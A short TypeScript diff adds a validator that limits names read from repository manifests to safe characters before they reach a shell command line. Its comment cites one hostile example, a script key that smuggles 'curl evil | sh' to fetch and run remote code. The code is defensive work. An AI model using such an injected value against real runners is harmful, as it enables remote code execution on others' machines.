@@ -15,6 +15,18 @@ export interface ProvenanceInput {
   sources: Array<SourceRef | string>;
 }
 
+/**
+ * Whether a name read from a manifest may be interpolated into a command line.
+ *
+ * Script names, binary names and package managers come from repository
+ * content, and `run` strings are executed through a shell by the evidence
+ * runner. A script key such as `"test; curl evil | sh"` is legal JSON, so
+ * adapters must refuse anything beyond the characters real tools use.
+ */
+export function isSafeCommandToken(name: string): boolean {
+  return /^[A-Za-z0-9][A-Za-z0-9_.:@+\/-]{0,127}$/.test(name);
+}
+
 export function source(path: string, locator?: string): SourceRef {
   return locator === undefined ? { path } : { path, locator };
 }
